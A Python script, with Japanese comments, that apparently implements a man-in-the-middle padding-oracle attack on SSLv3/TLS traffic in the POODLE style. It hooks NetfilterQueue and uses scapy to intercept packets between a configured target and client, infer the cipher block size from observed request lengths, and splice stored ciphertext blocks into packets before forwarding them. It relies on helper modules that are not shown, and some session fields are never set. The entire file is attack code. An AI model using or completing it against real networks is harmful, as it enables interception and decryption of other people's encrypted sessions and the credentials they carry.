from netfilterqueue import NetfilterQueue
import scapy.all as scapy
from scapy.all import *
from scapy.layers.tls.all import TLS, TLSClientHello, TLSServerHello
from scapy.layers.http import *
from scapy.layers.tls import *
from scapy.all import IP, TCP
from utils.is_sslv3_packet import is_sslv3_packet
from utils.extract_ssl_message_type import extract_ssl_message_type
from utils.modify_and_send_packet import modify_and_send_packet
from utils.get_field import get_field
from scapy.layers.inet import IP, TCP

config = json.load(open('config.json'))

block_size = None


request_length_count = {}
post_request_length = None
ciphertext_length = 0
data_padding_size_needed = 0

# パケット毎に変わる情報を保持しておく


class Session:
    def __init__(self, src_port):
        self.downgrade_needed = False
        self.src_port = src_port
        self.ciphertext = None
        self.last_seq = None
        self.block = None


sessions = {}


def attack_callback(packet):
    global sessions
    global block_size
    global request_length_count
    global post_request_length
    global ciphertext_length
    global data_padding_size_needed

    pkt = IP(packet.get_payload())

    if pkt.src == config['target'] and pkt.dst == config['client'] and pkt.haslayer(TLS):
        src_port = pkt['TCP'].sport

        # src_portをキーに持つ形でリクエストごとの暗号文などの情報を保持しておく
        session = sessions[src_port] if src_port in sessions else Session(
            src_port)

        if session.ciphertext is not None and bytes(pkt)[-block_size:] == session.ciphertext[-block_size:]:
            new_bytes = bytes(pkt)[:-block_size] + session.block
            modify_and_send_packet(packet, IP(new_bytes))

        sessions[src_port] = session

        if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":

            # 同じ長さのパケットの観測回数が5回より少ない場合は、関係ないパケットの可能性がある
            request_length_count[len(pkt)] = request_length_count[len(
                pkt)] + 1 if len(pkt) in request_length_count else 1
            if request_length_count[len(pkt)] < 5:
                packet.accept()
                return

            # POSTのリクエスト長が毎回更新されてしまうとバグる
            if post_request_length is None:
                post_request_length = len(pkt)

            if block_size is None:
                if ciphertext_length > 0:
                    if len(pkt) > ciphertext_length:
                        block_size = len(pkt) - ciphertext_length

                        current_len = len(pkt)
                        while (current_len - block_size) in request_length_count:
                            current_len -= block_size
                        data_padding_size_needed = request_length_count[current_len]
                else:
                    ciphertext_length = len(pkt)

    packet.accept()


try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, attack_callback)
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
